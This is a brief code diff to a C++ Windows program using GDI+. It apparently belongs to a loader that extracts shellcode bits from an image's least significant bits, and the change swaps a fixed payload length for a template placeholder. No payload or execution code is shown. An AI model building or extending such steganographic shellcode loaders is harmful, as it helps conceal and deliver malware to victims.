@@ -2,6 +2,7 @@
 #include <windows.h>
 #include <gdiplus.h>
 #include <iostream>
+#define PAYLOAD_BITS {{ PAYLOAD_BITS }}
 #pragma comment(lib,"gdiplus.lib")
 
 using namespace Gdiplus;
@@ -13,7 +14,7 @@ char get_lsb(char target, char source) {
 
 
 
-const int shellcode_len = 45896;
+const int shellcode_len = PAYLOAD_BITS;
 char* payload_data = new char[shellcode_len / 8];
 
 
